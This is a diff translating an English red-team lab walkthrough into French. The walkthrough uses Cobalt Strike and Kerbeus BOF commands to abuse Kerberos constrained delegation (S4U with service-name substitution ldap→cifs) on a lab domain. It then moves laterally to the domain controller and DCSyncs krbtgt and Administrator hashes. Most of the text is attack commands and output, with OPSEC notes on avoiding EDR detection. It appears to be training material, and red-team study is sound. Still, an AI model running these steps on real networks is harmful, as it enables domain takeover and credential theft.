@@ -1,40 +1,40 @@
-# Kerberos Challenge  
+# Challenge Kerberos  
 
-> **Objective:** Identify and exploit a Kerberos misconfiguration to move laterally to `lon-dc-1` and list the contents of `C$` on the domain controller.
+> **Objectif :** identifier une mauvaise configuration Kerberos, effectuer un **Lateral Movement** vers `lon-dc-1` et lister le partage `C$` du Domain Controller.
 
-> **Technique:** Constrained delegation with **service name substitution** (`ldap` → `cifs`). `LON-WKSTN-1$` is delegated to `ldap/lon-dc-1` — no CIFS in the delegation list.  
-> By substituting the service class in the unencrypted ticket header, the CIFS ticket is accepted by the target because the DC only validates the encrypted PAC, not the SPN prefix.  
+> **Technique :** Constrained Delegation avec **Service Name Substitution** (`ldap` → `cifs`). `LON-WKSTN-1$` possède une delegation vers `ldap/lon-dc-1`, sans CIFS dans la liste.  
+> La substitution de la classe du service dans la partie non chiffrée du ticket permet, dans ce lab, de présenter un ticket CIFS accepté par la cible.  
 
->This challenge uses `ldap/lon-dc-1` → `cifs/lon-dc-1` against the domain controller itself.  
+>Le challenge applique la transformation `ldap/lon-dc-1` → `cifs/lon-dc-1` contre le Domain Controller lui-même.  
 
 ---
 
-## Prerequisites
+## Prérequis
 
-Load the Kerbeus BOF aggressor script before running any `krb_*` commands:
+Charger le script Aggressor **Kerbeus BOF** avant d'utiliser les commandes `krb_*` :
 
 ```
 Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
 ```
 
-> OPSEC-🟢SAFE — BOF-based Kerberos operations run in beacon thread with no child process spawn.
+> OPSEC-🟢SAFE — Les opérations Kerberos basées sur BOF s'exécutent dans le thread du Beacon, sans création de child process.
 
 <img src="/images/kerberos-challenge01.png" width=860>
 
-> Two beacons on LON-WKSTN-1 — `pchilds` (user) and `SYSTEM*` (machine). Kerbeus-BOF script visible in Script Manager.  
-> The SYSTEM beacon is required to access LUID `0x3e7`.  
+> Deux Beacons sur LON-WKSTN-1 — `pchilds` (user) and `SYSTEM*` (machine). Le script Kerbeus-BOF est chargé dans Script Manager.  
+> Le Beacon SYSTEM est nécessaire pour accéder au LUID `0x3e7`.  
 
 ----
 
-## Step 1 — Enumerate existing Kerberos tickets
+## Étape 1 — Énumérer les tickets Kerberos
 
-From the beacon running as SYSTEM on `lon-wkstn-1`:
+Depuis le Beacon SYSTEM de `lon-wkstn-1` :
 
 ```cs
 krb_triage
 ```
 
-krb_triage output — machine account logon sessions present:
+Sortie de `krb_triage` — sessions de logon du compte machine :
 
 ```
 | LUID    | Client               | Service                               | End Time            |
@@ -44,21 +44,21 @@ krb_triage output — machine account logon sessions present:
 | 0:0x3e7 | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com/contoso.com | 13.04.2026 06:06:12 |
 ```
 
-LUID `0x3e7` is the **machine account SYSTEM logon session** — always present on any domain-joined host.
+LUID `0x3e7` correspond à la **session de logon SYSTEM du compte machine**, présente sur un hôte joint au domaine.
 
 <img src="/images/kerberos-challenge02.png" width=860>
 
-> `krb_triage` output showing LUID `0x3e7` (LON-WKSTN-1$ machine account) tickets. Also visible: first `ldapsearch` run with `userAccountControl` filter finding `LON-DC-1$`.
+> `krb_triage` montre le LUID `0x3e7` (LON-WKSTN-1$ tickets du compte machine. On voit aussi un premier `ldapsearch` filtré sur `userAccountControl` qui identifie `LON-DC-1$`.
 
 ---
 
-## Step 2 — Enumerate constrained delegation configuration
+## Étape 2 — Énumérer la Constrained Delegation
 
 ```cs
 ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
 ```
 
-ldapsearch Output:
+Sortie de `ldapsearch` :
 
 ```
 userAccountControl: 16781312
@@ -69,23 +69,23 @@ retreived 1 results total
 
 > OPSEC-🟢SAFE — BOF ldapsearch, runs in beacon thread, no child process.
 
-**Finding:** `LON-WKSTN-1$` has constrained delegation configured for `ldap/lon-dc-1.contoso.com` — **LDAP only, no CIFS**. This is the misconfiguration. The service class `ldap` can be substituted with `cifs` in the ticket header because the target DC only validates the encrypted portion.
+**Résultat :** `LON-WKSTN-1$` dispose d'une Constrained Delegation vers `ldap/lon-dc-1.contoso.com` — **LDAP only, no CIFS**. C'est la mauvaise configuration étudiée. La classe de service `ldap` peut être remplacée par `cifs` dans le ticket dans le cadre du lab.
 
-`userAccountControl: 16781312` = `TRUSTED_TO_AUTH_FOR_DELEGATION` flag set (S4U2self enabled without requiring a password).
+`userAccountControl: 16781312` = `TRUSTED_TO_AUTH_FOR_DELEGATION` activé (S4U2self sans mot de passe utilisateur).
 
 <img src="/images/kerberos-challenge03.png" width=860>
 
-> `ldapsearch` with `msDS-AllowedToDelegateTo=*` filter — confirms `LON-WKSTN-1$` is delegated to `ldap/lon-dc-1.contoso.com, ldap/lon-dc-1`. No CIFS entry — this is the misconfiguration to exploit.
+> `ldapsearch` avec le filtre `msDS-AllowedToDelegateTo=*` confirme que `LON-WKSTN-1$` is delegated to `ldap/lon-dc-1.contoso.com, ldap/lon-dc-1`. Aucune entrée CIFS : c'est le point exploité dans le challenge.
 
 ---
 
-## Step 3 — Dump the machine account TGT
+## Étape 3 — Récupérer le TGT du compte machine
 
 ```cs
 krb_dump /luid:3e7 /service:krbtgt
 ```
 
-Output (truncated):
+Résultat (tronqué) :
 
 ```
 UserName        : LON-WKSTN-1$
@@ -103,21 +103,21 @@ Authentication  : Negotiate
     doIFrDCCBaigAwIBBaEDAg<snip>AgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==
 ```
 
-OPSEC-🟠CAUTION — BOF, no child process. Uses `LsaCallAuthenticationPackage` Kerberos API — EDR hooks on this API will fire. Does not touch LSASS memory directly.
+OPSEC-🟠CAUTION — BOF sans child process. Utilise l'API Kerberos `LsaCallAuthenticationPackage`, qui peut être surveillée par l'EDR. Pas d'accès direct à la mémoire LSASS.
 
-Copy the full base64 TGT string (ticket index `[0]` — the forwarded, forwardable ticket). Used in the next step.
+Copier le TGT Base64 complet (ticket d'index `[0]`, marqué forwarded et forwardable) pour l'étape suivante.
 
 ---
 
-## Step 4 — S4U abuse with service name substitution
+## Étape 4 — S4U avec Service Name Substitution
 
-Use the machine TGT to perform S4U2proxy for the delegated SPN (`ldap/lon-dc-1`), then substitute the service class to `cifs`:
+Utiliser le TGT machine pour effectuer S4U2proxy avec le SPN délégué (`ldap/lon-dc-1`), puis remplacer la classe de service par `cifs` :
 
 ```cs
 krb_s4u /ticket:doIFrDCCBaigAwIBBaEDAgEWoo <snip> d0GwtDT05UT1NPLkNPTQ== /service:ldap/lon-dc-1 /altservice:cifs /impersonateuser:Administrator
 ```
 
-krb_s4u Output:
+Sortie de `krb_s4u` :
 
 ```
 [*] Action: S4U
@@ -136,11 +136,11 @@ krb_s4u Output:
 doIGhDCCBoCgAwIBBaED <snip> hEjAQGwRjaWZzGwhsb24tZGMtMQ==
 ```
 
-> OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write on target.
+> OPSEC-🟢SAFE — `krb_s4u` est un BOF exécuté dans le thread du Beacon, sans child process ni écriture sur le disque de la cible.
 
-## Step 5 — Save the service ticket to disk (attacker machine only)
+## Étape 5 — Enregistrer le service ticket sur l'Attacker Desktop
 
-Run this in a **local PowerShell terminal on the attacker desktop** (not via beacon):
+Exécuter cette commande dans un terminal PowerShell **local sur l'Attacker Desktop**, et non dans le Beacon :
 
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("doIGhDCCBoCgAwIBBaEDAgEWooIFnDCC<snip>QGwRjaWZzGwhsb24tZGMtMQ=="))
@@ -148,24 +148,24 @@ Run this in a **local PowerShell terminal on the attacker desktop** (not via bea
 
 <img src="/images/kerberos-challenge05.png" width=860>
 
-> CS beacon showing full `krb_s4u` flow: S4U2self TGS for Administrator → S4U2proxy for `ldap/lon-dc-1` → service name substituted to `cifs` → base64 ticket output. Immediately followed by `make_token CONTOSO\Administrator FakePass` (netonly) and `kerberos_ticket_use` injecting the kirbi.
+> CS beacon présente le déroulement complet de `krb_s4u` : S4U2self TGS for Administrator → S4U2proxy for `ldap/lon-dc-1` → service name substituted to `cifs` → base64 ticket output. Suivi de `make_token CONTOSO\Administrator FakePass` (netonly), puis de `kerberos_ticket_use` pour injecter le fichier `.kirbi`.
 
-**`/altservice:cifs`** Replaces the service class in the unencrypted EncTicketPart header. The KDC-signed encrypted PAC is unchanged. The target host validates only the encrypted portion and accepts the substituted ticket.
+**`/altservice:cifs`** Remplace la classe de service dans le champ non chiffré décrit par les notes. Le PAC signé par le KDC reste inchangé ; le ticket ainsi modifié est accepté dans l'environnement du lab.
 
-Copy the full base64 output for SPN `cifs/lon-dc-1`.
+Copier la totalité de la sortie Base64 du SPN `cifs/lon-dc-1`.
 
 
 <img src="/images/kerberos-challenge04.png">
 
-> PowerShell terminal showing the TGT ticket flags (`forwardable, forwarded, pre_authent, renewable`) confirming the ticket is usable for delegation, and the `WriteAllBytes` command saving the base64 service ticket to `.kirbi` on the attacker desktop.
+> Le terminal PowerShell montre les flags du TGT (`forwardable, forwarded, pre_authent, renewable`) qui confirment que le ticket est utilisable pour la delegation. La commande `WriteAllBytes` sauvegarde le service ticket Base64 en `.kirbi` sur l'Attacker Desktop.
 
 ---
 
-## Step 6 — Inject ticket and access the share
+## Étape 6 — Injecter le ticket et accéder au partage
 
-Back in the beacon on `lon-wkstn-1`:
+De retour dans le Beacon de `lon-wkstn-1` :
 
->`.kirbi` file is written to the attacker desktop only — nothing is written to the target DC. `kerberos_ticket_use` reads the file from the CS client and injects it over the C2 channel.  
+>`.kirbi` est enregistré uniquement sur l'Attacker Desktop, sans écriture sur le DC cible. `kerberos_ticket_use` lit le fichier depuis le client Cobalt Strike et l'injecte par le canal C2.  
 
 ```cs
 make_token CONTOSO\Administrator FakePass
@@ -173,7 +173,7 @@ kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
 ls \\lon-dc-1\c$
 ```
 
->File list Output:  
+>Résultat de la liste des fichiers :  
 
 ```
  Size     Type    Last Modified         Name
@@ -190,17 +190,17 @@ ls \\lon-dc-1\c$
  1gb      fil     04/12/2026 14:05:24   pagefile.sys
 ```
 
-> OPSEC-🟢SAFE — `make_token` creates a sacrificial logon session in beacon memory.  
-> `kerberos_ticket_use` injects the ticket into that session — no disk write on target, no child process.  
+> OPSEC-🟢SAFE — `make_token` crée une session de logon temporaire dans le contexte Beacon.  
+> `kerberos_ticket_use` injecte le ticket dans cette session, sans écriture sur disque ni child process côté cible.  
 
-## Lateral Movement to DC
+## Lateral Movement vers le DC
 
 ```
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 jump scshell64 lon-dc-1 smb
 ```
 
->beacon jump output:  
+>Résultat du jump Beacon :  
 
 ```
 [04/28 10:08:05] [+] host called home, sent: 396130 bytes
@@ -230,7 +230,7 @@ getuid
 ipconfig
 ```
 
->ipconfig output:  
+>Sortie de `ipconfig` :  
 ```
 received output:
 {786FFF21-9572-488C-94B9-FD396C9802A4}
@@ -243,13 +243,13 @@ DNS Suffix: 	contoso.com
 DNS Server: 	127.0.0.1
 ```
 
-## DCSync on DC
+## DCSync sur le DC
 
 ```
 dcsync contoso.com CONTOSO\krbtgt
 ```
 
-dcsync output krbtgt:
+Sortie DCSync pour `krbtgt` :
 
 ```
 ** SAM ACCOUNT **
@@ -274,7 +274,7 @@ Credentials:
 dcsync contoso.com CONTOSO\Administrator
 ```
 
-Output dcsync admin
+Sortie DCSync pour Administrator
 
 ```
 ** SAM ACCOUNT **
@@ -291,7 +291,7 @@ Credentials:
   Hash NTLM: fc525c9683e8fe067095ba2ddc971889
 ```
 
-## End
+## Fin du lab
 
 ```                                   
 note london dc
@@ -324,5 +324,5 @@ portscan 10.10.120.0-10.10.121.255 1-1024,3389,5000-6000 arp 1024
 screenshot
 ```
 
->Lab objective: COMPLETE. Kerberos Constrained delegation abuse → SYSTEM on LON-DC-1 → DCSync krbtgt. Full kill chain and extra.  
+>Objectif du lab : **terminé**. Kerberos Constrained delegation abuse → SYSTEM on LON-DC-1 → DCSync krbtgt. Kill Chain complète avec étapes complémentaires.  
 
